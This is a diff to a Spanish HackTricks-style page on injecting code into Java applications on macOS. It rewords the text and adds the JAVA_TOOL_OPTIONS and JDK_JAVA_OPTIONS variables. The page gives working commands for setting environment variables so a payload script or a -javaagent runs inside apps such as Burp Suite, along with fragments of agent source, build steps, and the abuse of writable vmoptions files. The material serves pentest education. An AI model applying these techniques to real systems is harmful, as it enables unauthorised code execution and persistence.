@@ -1,10 +1,10 @@
-# Inyección de aplicaciones Java
+# Inyección en aplicaciones Java
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Enumeración
 
-Busca las aplicaciones Java instaladas en tu sistema. Se observó que las aplicaciones Java en **Info.plist** contienen algunos parámetros de Java que incluyen la cadena **`java.`**, por lo que puedes buscarla:
+Busca las aplicaciones Java instaladas en tu sistema. Se observó que las aplicaciones Java en **Info.plist** contendrán algunos parámetros de Java que incluyen la cadena **`java.`**, por lo que puedes buscarla:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,7 +14,14 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-La variable de entorno **`_JAVA_OPTIONS`** se puede utilizar para inyectar parámetros arbitrarios de la VM de Java cuando se inicia una aplicación Java.<sup>[[1]](#references)</sup>
+La variable de entorno **`_JAVA_OPTIONS`** puede utilizarse para inyectar parámetros arbitrarios de Java VM cuando se inicia una aplicación Java.<sup>[[1]](#references)</sup>
+
+La pila de lanzamiento de Java también reconoce dos variables mejor definidas con diferentes ámbitos:
+
+- `JAVA_TOOL_OPTIONS` se lee cuando se crea la VM, incluidas algunas rutas de lanzamiento integradas que no pasan por el lanzador `java`. Puede inyectar opciones de instrumentación como `-javaagent`, `-agentlib` o `-agentpath`.<sup>[[4]](#references)</sup>
+- `JDK_JAVA_OPTIONS` se antepone mediante el lanzador `java` a su línea de comandos. Las opciones que seleccionan la clase principal o terminan el lanzador están prohibidas, pero `-javaagent` se acepta.<sup>[[5]](#references)</sup>
+
+Las tres variables deben tratarse como controles de ejecución de código de la JVM cuando un atacante también puede proporcionar un agent compatible y legible. `_JAVA_OPTIONS` es un detalle de implementación de HotSpot, por lo que debe validarse con el proveedor y la versión exactos; `JAVA_TOOL_OPTIONS` o `JDK_JAVA_OPTIONS` son preferibles para realizar pruebas portables.
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
@@ -81,11 +88,17 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 # Or
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
+
+# The same agent with the standardized VM initialization variable:
+JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
+
+# Or through the JDK java launcher:
+JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
 ```
 > [!CAUTION]
-> Crear el agente con una **versión de Java diferente** de la de la aplicación puede bloquear tanto el agente como la aplicación.
+> Crear el agente con una **versión de Java diferente** a la de la aplicación puede bloquear tanto el agente como la aplicación.
 
-El agente puede estar en:
+Dónde puede estar el agente:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,7 +115,7 @@ err.printStackTrace();
 }
 }
 ```
-Para compilar el agent ejecuta:
+Para compilar el agente, ejecuta:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -114,7 +127,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Y luego exporta la variable de entorno y ejecuta la aplicación Java así:
+Y luego exporta la variable de entorno y ejecuta la aplicación Java de esta forma:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -125,10 +138,10 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## archivo vmoptions
 
-Este archivo permite especificar **parámetros de Java** cuando se ejecuta Java. Puedes usar algunas de las técnicas anteriores para cambiar los parámetros de Java y **hacer que el proceso ejecute comandos arbitrarios**.\
-Además, este archivo también puede **incluir otros archivos** con la directiva `include`, por lo que también puedes cambiar un archivo incluido.
+Este archivo permite especificar **parámetros de Java** cuando se ejecuta Java. Puedes utilizar algunas de las técnicas anteriores para cambiar los parámetros de Java y **hacer que el proceso ejecute comandos arbitrarios**.\
+Además, este archivo también puede **incluir otros archivos** mediante la directiva `include`, por lo que también puedes modificar un archivo incluido.
 
-Más aún, algunas aplicaciones Java **cargarán más de un** archivo `vmoptions`.
+Es más, algunas aplicaciones Java **cargarán más de un archivo `vmoptions`**.
 
 Algunas aplicaciones, como Android Studio, indican en su **salida dónde buscan** estos archivos:<sup>[[3]](#references)</sup>
 ```bash
@@ -149,11 +162,13 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Ten en cuenta que Android Studio en este ejemplo intenta cargar **`/Applications/Android Studio.app.vmoptions`**, una ubicación en la que cualquier usuario del grupo **`admin` tiene acceso de escritura**.
+Ten en cuenta que Android Studio en este ejemplo intenta cargar **`/Applications/Android Studio.app.vmoptions`**, una ubicación donde cualquier usuario del grupo **`admin` tiene permisos de escritura**.
 
 ## References
 
 - [1] [OpenJDK — análisis de `_JAVA_OPTIONS` en `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
 - [2] [Oracle Java — especificación del paquete `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
-- [3] [JetBrains — configuración de las opciones de JVM y las propiedades de la plataforma](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
+- [3] [JetBrains — Configuración de las opciones de JVM y las propiedades de la plataforma](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
+- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
+- [5] [El lanzador `java` — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
 {{#include ../../../banners/hacktricks-training.md}}
